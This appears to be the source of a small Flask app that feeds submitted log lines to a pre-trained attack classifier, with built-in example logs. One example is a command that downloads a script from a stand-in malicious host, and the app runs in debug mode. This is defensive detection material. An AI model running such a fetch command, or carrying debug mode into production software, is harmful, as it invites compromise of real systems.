# app.py

from flask import Flask, render_template, request
import joblib

# Load model and vectorizer
model = joblib.load('attack_classifier.pkl')
vectorizer = joblib.load('vectorizer.pkl')

# Pre-made example logs
example_logs = [
    "Failed login attempt for root from IP 10.0.0.5",
    "Executed command: uname -a",
    "wget http://malicious.site/malware.sh",
    "Nmap scan detected on SSH port 22",
    "External IP attempted login as root with password 'admin'"
]

# Create the Flask app
app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    prediction = None
    selected_log = None
    if request.method == 'POST':
        # Check if user picked an example
        if 'example_log' in request.form and request.form['example_log'] != "":
            log_message = request.form['example_log']
        else:
            log_message = request.form['log_message']

        selected_log = log_message
        log_vectorized = vectorizer.transform([log_message])
        prediction = model.predict(log_vectorized)[0]
    return render_template('index.html', prediction=prediction, example_logs=example_logs, selected_log=selected_log)

if __name__ == '__main__':
    app.run(debug=True)

